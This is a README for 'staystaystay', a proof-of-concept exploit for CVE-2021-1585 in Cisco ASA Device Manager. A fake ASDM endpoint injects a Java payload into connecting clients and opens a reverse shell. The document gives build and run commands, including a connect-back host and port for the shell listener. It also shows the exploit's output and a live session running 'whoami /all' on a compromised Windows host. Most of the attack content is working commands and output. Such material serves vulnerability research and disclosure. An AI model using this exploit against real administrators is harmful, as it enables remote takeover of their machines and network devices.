# staystaystay

`staystaystay` is a proof of concept exploit for [CVE-2021-1585](https://nvd.nist.gov/vuln/detail/CVE-2021-1585), a man in the middle or evil endpoint RCE issue affecting Cisco ASA Device Manager (ASDM). The issue was originally discovered by [Malcolm Lashley](https://gist.github.com/mlashley/7d2c16e91fe37c9ab3b2352615540025) and disclosed in the summer of 2021. However, since the issue remains unpatched in the latest version (ASDM 7.17(1)), I stumbled upon this independently.

If a victim connects their ASDM to `staystaystay` then it will inject a [Longtime Sunshine](https://github.com/jbaines-r7/longtime-sunshine) payload resulting in a reverse shell. See the following video for an example:

* https://www.youtube.com/watch?v=07VO2JGTWR8

An AttackerKB write up can be found here:

* https://attackerkb.com/topics/0vIso8fLhQ/cve-2021-1585/rapid7-analysis

## Usage

Clone and execute [Longtime Sunshine](https://github.com/jbaines-r7/longtime-sunshine). It will listen on 1270 by default.

```sh
albinolobster@ubuntu:~/longtime_sunshine$ sudo apt install nodejs npm
albinolobster@ubuntu:~/longtime_sunshine$ npm install
albinolobster@ubuntu:~/longtime_sunshine$ node longtime.js

   01101100 01101111 01101110 01100111 01110100 
   01101001 01101101 01100101 00100000 01110011 
   01110101 01101110 01110011 01101000 01101001 
  ╦  ┌─┐┌┐┌┌─┐┌┬┐┬┌┬┐┌─┐  ╔═╗┬ ┬┌┐┌┌─┐┬ ┬┬┌┐┌┌─┐
  ║  │ │││││ ┬ │ ││││├┤   ╚═╗│ ││││└─┐├─┤││││├┤ 
  ╩═╝└─┘┘└┘└─┘ ┴ ┴┴ ┴└─┘  ╚═╝└─┘┘└┘└─┘┴ ┴┴┘└┘└─┘
   01101110 01100101 00100000 01110101 01110000 
   01101111 01101110 00100000 01101101 01100101 

$
```

Build and run `staystaystay`. It was written by a lazy hack so it has some outside dependencies: `lzma` and `javac`. The host *must* use Java 1.8 because that is what the ASDM client requires. `lhost` and `lport` should point the `Longtime Sunshine`:

```sh
albinolobster@ubuntu:~/staystaystay$ mkdir build
albinolobster@ubuntu:~/staystaystay$ cd build/
albinolobster@ubuntu:~/staystaystay/build$ cmake ..
-- The C compiler identification is GNU 10.3.0
-- The CXX compiler identification is GNU 10.3.0
-- Detecting C compiler ABI info
-- Detecting C compiler ABI info - done
-- Check for working C compiler: /usr/bin/cc - skipped
-- Detecting C compile features
-- Detecting C compile features - done
-- Detecting CXX compiler ABI info
-- Detecting CXX compiler ABI info - done
-- Check for working CXX compiler: /usr/bin/c++ - skipped
-- Detecting CXX compile features
-- Detecting CXX compile features - done
-- Configuring done
-- Generating done
-- Build files have been written to: /home/albinolobster/staystaystay/build
albinolobster@ubuntu:~/staystaystay/build$ make
Scanning dependencies of target staystaystay
[ 50%] Building CXX object CMakeFiles/staystaystay.dir/src/main.cpp.o
[100%] Linking CXX executable staystaystay
[100%] Built target staystaystay
albinolobster@ubuntu:~/staystaystay/build$ sudo ./staystaystay --lhost 10.0.0.3 --lport 1270
[sudo] password for albinolobster: 
[+] User provided a connect back target of 10.0.0.3:1270
[+] Compiling Payload using `javac PDMApplet.java SgzApplet.java`
[+] Creating JAR entries
[+] Compressing jar entries with `lzma -z jars`
[+] Adding sgz wrapper
[+] Flushing the pdm.sgz to disk
[+] Copying pdm.sgz to the http server
[+] Changing working directory to ../http
[+] Starting python server on :443. Hope you are running as root... it's fine.
Generating a RSA private key
...............................................................................................................................................................................................................................................++++
.......++++
writing new private key to 'key.pem'
-----
Server running on https://0.0.0.0:443
```

Upon successful exploit you should get something like this:

```
albinolobster@ubuntu:~/longtime-sunshine$ nodejs ./longtime.js 

   01101100 01101111 01101110 01100111 01110100 
   01101001 01101101 01100101 00100000 01110011 
   01110101 01101110 01110011 01101000 01101001 
  ╦  ┌─┐┌┐┌┌─┐┌┬┐┬┌┬┐┌─┐  ╔═╗┬ ┬┌┐┌┌─┐┬ ┬┬┌┐┌┌─┐
  ║  │ │││││ ┬ │ ││││├┤   ╚═╗│ ││││└─┐├─┤││││├┤ 
  ╩═╝└─┘┘└┘└─┘ ┴ ┴┴ ┴└─┘  ╚═╝└─┘┘└┘└─┘┴ ┴┴┘└┘└─┘
   01101110 01100101 00100000 01110101 01110000 
   01101111 01101110 00100000 01101101 01100101 

$ 
☀  Connection established by 10.0.0.25:62981
$ agent 0
lowlevel@10.0.0.25$ exec whoami /all

USER INFORMATION
----------------

User Name        SID                                          
================ =============================================
okhuman\lowlevel S-1-5-21-259238101-1730513016-1302440715-1105


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                        
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Performance Log Users              Alias            S-1-5-32-559 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

## Credit

* Taylor Swift - [Acoustic version](https://www.youtube.com/watch?v=JbiTT82XAo0&t=2423s)
